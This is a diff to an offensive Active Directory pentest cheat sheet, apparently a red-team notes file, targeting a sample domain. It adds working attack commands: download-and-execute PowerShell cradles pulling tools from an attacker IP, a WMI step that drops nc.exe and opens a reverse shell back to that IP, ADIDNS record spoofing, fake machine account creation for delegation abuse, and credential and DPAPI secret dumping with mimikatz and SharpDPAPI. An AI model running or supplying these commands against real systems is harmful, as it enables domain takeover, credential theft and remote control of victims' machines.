@@ -960,8 +960,8 @@ PowerView3 > Get-DomainComputer -Unconstrained | select dnshostname,samaccountna
 Load tools:
 
 ```
-PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.37/powermad.ps1")
-PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.37/powerview4.ps1")
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powermad.ps1")
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powerview4.ps1")
 ```
 
 Check if `ms-DS-MachineAccountQuota` allows to create new machine accounts:
@@ -989,7 +989,7 @@ Add new machine account and configure RBCD on the vulnerable host (DC01):
 
 ```
 PS > New-MachineAccount -MachineAccount fakemachine1337 -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
-PowerView3 > $computerSID = Get-DomainComputer -Identity fakemachine1337 -Properties ObjectSid -Verbose -Credential $Cred | Select -Expand ObjectSid
+PowerView3 > $computerSID = Get-DomainComputer -Identity fakemachine1337 -Properties ObjectSid -Verbose -Credential $cred | Select -Expand ObjectSid
 PS > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($computerSID))"
 PS > $SDBytes = New-Object byte[] ($SD.BinaryLength)
 PS > $SD.GetBinaryForm($SDBytes, 0)
@@ -1021,7 +1021,7 @@ PS > ...DCSync...
 Cleanup:
 
 ```
-PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $Cred | Set-DomainObject -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose -Credential $Cred
+PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $cred | Set-DomainObject -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose -Credential $cred
 ```
 
 ##### PowerView 4.0
@@ -1114,6 +1114,69 @@ $ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.1
 ```
 $ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
 $ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
+```
+
+
+
+
+## ADIDNS Abuse
+
+* [https://blog.netspi.com/exploiting-adidns/](https://blog.netspi.com/exploiting-adidns/)
+* [https://blog.netspi.com/adidns-revisited/](https://blog.netspi.com/adidns-revisited/)
+* [https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/](https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/)
+
+0\. Load tools:
+
+```
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powermad.ps1")
+```
+
+1\. Check if you are able to modify (add) AD DNS names:
+
+```
+PS > Get-ADIDNSZone -Credential $cred -Verbose
+DC=megacorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local
+DC=RootDNSServers,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local
+DC=_msdcs.megacorp.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=megacorp,DC=local
+DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=megacorp,DC=local
+
+PS > Get-ADIDNSPermission -Credential $cred -Verbose | ? {$_.Principal -eq 'NT AUTHORITY\Authenticated Users'}
+Principal             : NT AUTHORITY\Authenticated Users
+IdentityReference     : S-1-5-11
+ActiveDirectoryRights : CreateChild
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+```
+
+`CreateChild` permission is what we need.
+
+2\. Create, configure the new DNS name that could be likely exploited for spoofing with Attacker's IP and enable it. I chose `pc01` which was found in DNS cache:
+
+```
+PS > New-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
+PS > $dnsRecord = New-DNSRecordArray -Type A -Data 10.10.13.37
+PS > Set-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Value $dnsRecord -Credential $cred -Verbose
+PS > Enable-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
+```
+
+3\. Check the newly created DNS object and try to resolve it. AD will need some time (\~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol:
+
+```
+PS > Get-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Credential $cred -Verbose
+PS > Resolve-DNSName pc01
+PS > cmd /c ping -n 1 pc01
+```
+
+4\. Cleanup:
+
+```
+PS > Remove-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
 ```
 
 
@@ -1782,6 +1845,23 @@ $ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 
 
 
+### PowerShell
+
+Basic command to check if we have privileges to execute WMI:
+
+```
+PS > Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namesapce" | Select Name
+```
+
+Execute commands:
+
+```
+PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
+PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
+```
+
+
+
 ### wmiexec.py
 
 ```
@@ -1825,7 +1905,6 @@ PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
 $ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
 Or
 mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonPasswords full
 ```
 
 Grep for secrets:
@@ -1843,7 +1922,7 @@ $ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain 
 ### Mimikatz
 
 ```
-Cmd > .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+Cmd > .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
 ```
 
 
@@ -1854,6 +1933,7 @@ meterpreter > getsystem
 meterpreter > load kiwi
 meterpreter > creds_msv
 meterpreter > creds_all
+meterpreter > lsa_dump_secrets
 ```
 
 
@@ -1977,7 +2057,34 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappd
 Unhide files:
 
 ```
+PS > cmd /c "attrib -h -s 00ff00ff-00ff-00ff-00ff-00ff00ff00ff
 PS > cmd /c "attrib -h -s 00ff00ff00ff00ff00ff00ff00ff00ff"
+```
+
+
+
+### Mimikatz
+
+* [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
+
+Decrypt manually offline with known plaintext password:
+
+```
+mimikatz # dpapi::masterkey /in:00ff00ff-00ff-00ff-00ff-00ff00ff00ff /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:Passw0rd!
+mimikatz # dpapi::cache
+mimikatz # dpapi::cred /in:00ff00ff00ff00ff00ff00ff00ff00ff
+```
+
+
+
+### SharpDPAPI
+
+* [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
+* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1)
+
+```
+PS > .\SharpDPAPI.exe triage /password:Passw0rd!
+PS > .\SharpDPAPI.exe machinetriage /password:Passw0rd!
 ```
 
 
@@ -2339,7 +2446,7 @@ Nim > .\encrypted_assembly_loader.exe Passw0rd! b64.txt --Command logonpasswords
 
 
 
-## Windows Defender
+## Defender
 
 Disable real-time protection (proactive):
 
@@ -4077,6 +4184,7 @@ $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -
 ```
 PS > Invoke-Portscan -Hosts 127.0.0.0/24 -sn -noProgressMeter
 PS > Invoke-Portscan -Hosts 127.0.0.0/24 -T 4 -TopPorts 25 -oA top25
+PS > Invoke-Portscan -Hosts 127.0.0.1 -Ports 21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017
 ```
 
 
